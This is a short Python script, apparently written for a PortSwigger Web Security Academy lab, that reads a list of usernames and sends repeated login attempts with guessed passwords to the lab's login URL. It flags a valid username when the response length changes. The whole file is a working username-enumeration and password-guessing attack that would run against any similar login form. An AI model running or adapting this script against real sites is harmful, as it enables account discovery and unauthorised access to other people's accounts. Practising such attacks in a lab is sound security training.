import readline
import requests

user_path = "./usernames.txt"
lab_url = "https://0a2600d90304875ec0188e5b00a100ec.web-security-academy.net/login"

length = 0
found = False

def get_usernames(path, user_list):
    with open(path) as usernames:
        for line in usernames:
            user_list.append(line.rstrip())
    return user_list

for user in get_usernames(user_path, []):
    print("Testing", user)
    for pwd in range(5):
        res = requests.post(lab_url,data={"username" : f"{user}", "password" : f"test{pwd}"})
        # Detect only differences in the response length
        if len(res.content) != length and length != 0:
            print("FOUND check the response", user)
            print(res.text)
            found = True
            break
        length = len(res.content)
    if found:
        break
        

